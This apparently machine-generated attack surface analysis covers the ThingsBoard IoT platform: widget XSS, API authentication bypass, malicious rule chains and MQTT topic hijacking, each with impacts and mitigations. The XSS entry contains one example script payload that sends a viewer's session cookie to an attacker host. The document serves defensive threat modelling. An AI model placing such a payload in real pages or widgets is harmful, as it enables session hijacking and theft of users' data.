# Attack Surface Analysis for thingsboard/thingsboard

## Attack Surface: [Cross-Site Scripting (XSS) in Custom Widgets](./attack_surfaces/cross-site_scripting__xss__in_custom_widgets.md)

*   **Description:** Attackers inject malicious scripts into custom widgets that are then executed in other users' browsers when they view the dashboard.
*   **How ThingsBoard Contributes:** ThingsBoard allows users to create and upload custom widgets, often involving JavaScript, without strict input sanitization or output encoding on the platform side.
*   **Example:** A malicious user creates a custom widget containing `<script>window.location.href='https://attacker.com/steal?cookie='+document.cookie;</script>` and uploads it. When another user views a dashboard containing this widget, their session cookie is sent to the attacker.
*   **Impact:** Session hijacking, data theft, defacement of dashboards, redirection to malicious sites.
*   **Risk Severity:** High
*   **Mitigation Strategies:**
    *   **Input Sanitization and Output Encoding:** Implement robust server-side sanitization and encoding of any user-provided input used in custom widgets.
    *   **Content Security Policy (CSP):**  Implement a strict CSP to limit the sources from which scripts can be loaded and executed.
    *   **Regular Security Audits:** Review custom widget functionality for potential XSS vulnerabilities.
    *   **Sandboxing or Isolation:**  If possible, isolate the execution environment of custom widgets to limit their access to sensitive data and browser functionalities.

## Attack Surface: [API Authentication and Authorization Bypass](./attack_surfaces/api_authentication_and_authorization_bypass.md)

*   **Description:** Attackers bypass authentication or authorization mechanisms to gain unauthorized access to ThingsBoard APIs (REST, MQTT, CoAP, gRPC).
*   **How ThingsBoard Contributes:**  Weaknesses in the implementation of API key validation, JWT handling, or other authentication methods within ThingsBoard can create vulnerabilities. Insufficiently granular role-based access control can also lead to authorization bypass.
*   **Example:** An attacker finds a way to forge or reuse API keys, allowing them to send telemetry data as a legitimate device or access sensitive device information they shouldn't have access to.
*   **Impact:** Data breaches, unauthorized device control, manipulation of system settings, denial of service.
*   **Risk Severity:** Critical
*   **Mitigation Strategies:**
    *   **Strong Authentication Mechanisms:** Enforce strong password policies, consider multi-factor authentication, and use robust API key generation and management.
    *   **Secure API Key Storage:** Store API keys securely (e.g., using hashing and salting).
    *   **Regularly Rotate API Keys:** Implement a policy for regular API key rotation.
    *   **Granular Role-Based Access Control (RBAC):** Implement and enforce a fine-grained RBAC system to limit access based on user roles and permissions.
    *   **Input Validation:** Thoroughly validate all input to API endpoints to prevent injection attacks that could be used to bypass authentication.
    *   **Rate Limiting and Throttling:** Implement rate limiting and throttling to prevent brute-force attacks on authentication endpoints.

## Attack Surface: [Malicious Rule Chain Creation and Modification](./attack_surfaces/malicious_rule_chain_creation_and_modification.md)

*   **Description:** Attackers with sufficient privileges create or modify rule chains to execute malicious logic, potentially impacting device data or external systems.
*   **How ThingsBoard Contributes:** The flexibility of the rule engine, allowing users to define complex data processing and action flows, can be exploited if access controls are not properly enforced within ThingsBoard.
*   **Example:** An attacker creates a rule chain that intercepts telemetry data from a critical device and modifies it before it's stored or forwarded, leading to incorrect readings or actions. Alternatively, they could create a rule that sends sensitive device data to an external, attacker-controlled server.
*   **Impact:** Data manipulation, unauthorized access to external systems, denial of service, disruption of device functionality.
*   **Risk Severity:** High
*   **Mitigation Strategies:**
    *   **Strict Access Control for Rule Chain Management:** Limit the ability to create and modify rule chains to trusted administrators or specific roles within ThingsBoard.
    *   **Input Validation in Rule Nodes:**  Implement validation within rule nodes to prevent the execution of malicious code or actions within the ThingsBoard rule engine.
    *   **Code Review for Custom Rule Nodes:** If custom rule nodes are developed, ensure they undergo thorough security code reviews.
    *   **Monitoring and Auditing of Rule Chain Changes:**  Implement logging and monitoring within ThingsBoard to track changes made to rule chains and identify suspicious activity.
    *   **Principle of Least Privilege:** Grant only the necessary permissions for users interacting with the rule engine within ThingsBoard.

## Attack Surface: [MQTT Topic Hijacking and Data Injection](./attack_surfaces/mqtt_topic_hijacking_and_data_injection.md)

*   **Description:** Attackers subscribe to sensitive MQTT topics or publish malicious data to topics, potentially affecting devices or the ThingsBoard platform.
*   **How ThingsBoard Contributes:**  If MQTT topics are not properly secured with authentication and authorization mechanisms provided by ThingsBoard, attackers can exploit this vulnerability.
*   **Example:** An attacker subscribes to the MQTT topic used by a smart lock device and sends a command to unlock the door via the ThingsBoard MQTT broker. Alternatively, they could inject false temperature readings for a critical sensor.
*   **Impact:** Unauthorized device control, data manipulation, disruption of services, potentially physical security breaches.
*   **Risk Severity:** Critical
*   **Mitigation Strategies:**
    *   **MQTT Authentication and Authorization:**  Enforce strong authentication and authorization for MQTT clients connecting to the ThingsBoard MQTT broker.
    *   **Secure Topic Design:**  Design MQTT topic structures that incorporate security considerations and restrict access based on roles or device ownership within ThingsBoard.
    *   **TLS Encryption:**  Use TLS encryption for all MQTT communication to protect data in transit to and from the ThingsBoard broker.
    *   **Input Validation on Received MQTT Messages:** Implement validation on the ThingsBoard side to ensure received MQTT messages conform to expected formats and values.
